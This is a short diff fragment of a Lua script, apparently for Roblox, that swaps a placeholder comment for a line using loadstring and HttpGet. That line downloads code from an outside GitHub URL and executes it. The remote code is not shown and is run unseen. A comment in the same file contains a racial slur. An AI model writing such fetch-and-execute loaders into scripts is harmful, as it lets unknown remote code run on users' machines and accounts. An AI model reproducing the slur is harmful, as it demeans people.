@@ -73,7 +73,7 @@ function unpack(...)
 end 
 
 
---[[ Script ]]-- 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tariviste/Gojo/main/Source"))()
 
 --> Put your obfuscated script here nigga 
 --> Using tbo as an example : It will freeze your game for a bit and then create a file named after your output
